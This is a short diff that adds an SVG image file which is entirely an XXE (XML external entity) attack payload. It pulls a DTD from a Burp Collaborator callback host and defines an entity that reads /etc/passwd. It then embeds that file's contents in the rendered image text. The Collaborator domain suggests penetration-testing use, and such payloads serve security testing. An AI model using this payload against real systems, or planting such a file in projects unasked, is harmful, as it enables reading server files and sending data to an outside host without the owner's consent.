@@ -1,0 +1,9 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg [
+  <!ENTITY % dtd SYSTEM "http://collab-test.burpcollaborator.net/svg_collab.dtd">
+  %dtd;
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg width="300" height="300" xmlns="http://www.w3.org/2000/svg">
+  <text x="20" y="50" font-size="16">&xxe;</text>
+</svg>
